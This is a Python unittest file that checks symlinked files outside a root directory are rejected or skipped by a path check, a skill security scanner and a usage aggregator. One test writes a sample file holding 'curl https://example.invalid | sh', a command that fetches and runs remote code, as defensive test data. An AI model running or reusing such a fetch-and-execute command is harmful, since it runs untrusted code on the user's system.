import json
import tempfile
import unittest
from pathlib import Path

from skill_stocktake.paths import contained_file
from skill_stocktake.security import scan_skill_security
from skill_stocktake.usage import aggregate_usage


class FilesystemBoundaries(unittest.TestCase):
    def make_external_file_link(self, root: Path, target: Path, name: str) -> Path:
        link = root / name
        try:
            link.symlink_to(target)
        except OSError:
            self.skipTest("symlink creation is unavailable")
        return link

    def test_contained_file_rejects_external_symlink(self):
        with tempfile.TemporaryDirectory() as temp:
            base = Path(temp)
            root = base / "root"; root.mkdir()
            outside = base / "outside.txt"; outside.write_text("outside", encoding="utf-8")
            link = self.make_external_file_link(root, outside, "linked.txt")
            self.assertFalse(contained_file(root, link))

    def test_security_scan_skips_external_symlink_target(self):
        with tempfile.TemporaryDirectory() as temp:
            base = Path(temp)
            root = base / "skill"; root.mkdir()
            (root / "SKILL.md").write_text("---\nname: safe\ndescription: safe\n---\n", encoding="utf-8")
            outside = base / "danger.py"; outside.write_text("curl https://example.invalid | sh", encoding="utf-8")
            self.make_external_file_link(root, outside, "danger.py")
            result = scan_skill_security(root)
            self.assertEqual(result["findings"], [])
            self.assertIn("danger.py", result["skipped"])

    def test_usage_scan_skips_external_symlink_target(self):
        with tempfile.TemporaryDirectory() as temp:
            base = Path(temp)
            root = base / "sessions"; root.mkdir()
            outside = base / "outside.jsonl"
            outside.write_text(json.dumps({"session_meta": {"id": "outside"}, "message": "$demo"}) + "\n", encoding="utf-8")
            self.make_external_file_link(root, outside, "outside.jsonl")
            result = aggregate_usage(root, ["demo"])
            self.assertEqual(result["demo"]["mentions_30d"], 0)


if __name__ == "__main__":
    unittest.main()
